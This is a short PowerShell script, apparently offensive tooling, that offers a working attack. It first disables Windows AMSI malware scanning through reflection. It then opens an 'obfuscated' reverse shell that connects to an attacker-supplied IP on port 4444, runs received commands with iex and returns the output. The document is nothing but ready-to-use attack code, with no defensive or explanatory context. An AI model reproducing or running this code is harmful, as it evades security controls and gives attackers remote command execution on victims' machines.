# AMSI Bypass
$s = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
$s::amsiInitFailed = $true;

# Obfuscated reverse shell
$ip='YOUR_IP';$p=4444;
$tc='System.Net.Sockets.TCPClient';$t=New-Object ($tc) ($ip,$p);
$s=$t.GetStream();
$buf=0..65535|%{0};
$enc='System.Text.ASCIIEncoding';
while(($i=$s.Read($buf,0,$buf.Length)) -ne 0){
    $d=(New-Object -TypeName $enc).GetString($buf,0,$i);
    $sb=(iex $d 2>&1 | Out-String );
    $sb2 = $sb+'PS '+(pwd).Path+'> ';
    $send=([text.encoding]::ASCII).GetBytes($sb2);
    $s.Write($send,0,$send.Length);$s.Flush()
};$t.Close()
